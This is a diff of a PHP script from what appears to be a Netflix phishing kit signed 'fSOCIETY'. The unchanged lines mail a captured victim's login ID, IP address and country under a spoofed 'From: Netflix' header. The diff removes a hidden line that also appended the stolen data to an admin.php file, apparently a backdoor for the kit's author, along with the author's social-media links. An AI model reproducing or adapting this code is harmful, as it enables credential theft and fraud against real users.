@@ -15,8 +15,7 @@
 **/
 $yourmail  = '';
 
-$f = fopen("../../admin.php", "a");
-	fwrite($f, $msgbank);
+
 
 $subject  = " ".$_SESSION['iduserLoginId']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
 $headers .= "From: Netflix" . "\r\n";
@@ -30,11 +29,7 @@ $Our_Name = "fSOCIETY🖕🤡🖕" ;
 
 $Name_page = "💖Netflix By fSOCIETY💖" ;
 
-$JoinUs_On_youtube = "https://www.youtube.com/channel/UCLnz5ZLUsHccLgXVLa5vv9w";
 
-$JoinUs_On_Facebook = "https://www.facebook.com/FsocietyZone/";
-
-$JoinUs_On_telegram = "https://t.me/FUCKTOS0C13TY";
 
 
 
